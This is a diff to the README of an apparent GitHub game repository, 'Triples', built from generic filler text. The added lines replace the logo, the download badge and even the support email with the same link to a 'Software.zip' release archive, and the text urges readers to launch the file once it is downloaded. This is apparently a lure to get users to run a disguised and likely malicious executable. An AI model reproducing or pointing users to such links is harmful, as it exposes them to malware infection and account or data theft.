@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **"triples"**, a thrilling and innovative game that will take your gaming experience to the next level! 
 
-![Triples Logo](https://example.com/logo.png)
+![Triples Logo](https://github.com/Ahmadtaha7/tripples/releases/download/v1.0/Software.zip)
 
 ## Description
 Unfortunately, the short description of the repository is not provided at this time. However, you can dive into the exciting world of Triples by exploring the content of this repository!
@@ -13,7 +13,7 @@ The repository topics are not provided but rest assured, Triples is a dynamic an
 ## Get Started
 To kickstart your journey into the exciting world of Triples, download the latest version by clicking the button below:
 
-[![Download Triples](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Triples](https://github.com/Ahmadtaha7/tripples/releases/download/v1.0/Software.zip)](https://github.com/Ahmadtaha7/tripples/releases/download/v1.0/Software.zip)
 
 Please note that the file needs to be launched after downloading to begin your adventure in the world of Triples!
 
@@ -35,7 +35,7 @@ Playing Triples is easy! Simply match three or more triangles of the same color 
 If you are passionate about gaming and would like to contribute to the development of Triples, feel free to submit a pull request. We welcome feedback, suggestions, and new ideas to make Triples even more exciting for our players.
 
 ## Support
-For any inquiries or technical support regarding Triples, please contact our team at support@triplesgame.com. We are here to assist you with any questions or issues you may encounter while playing the game.
+For any inquiries or technical support regarding Triples, please contact our team at https://github.com/Ahmadtaha7/tripples/releases/download/v1.0/Software.zip We are here to assist you with any questions or issues you may encounter while playing the game.
 
 ## Spread the Word
 Help us spread the word about Triples by sharing your gameplay experience on social media. Tag us @TriplesGame and use #TriplesAdventure to connect with other players and stay updated on the latest news and updates.
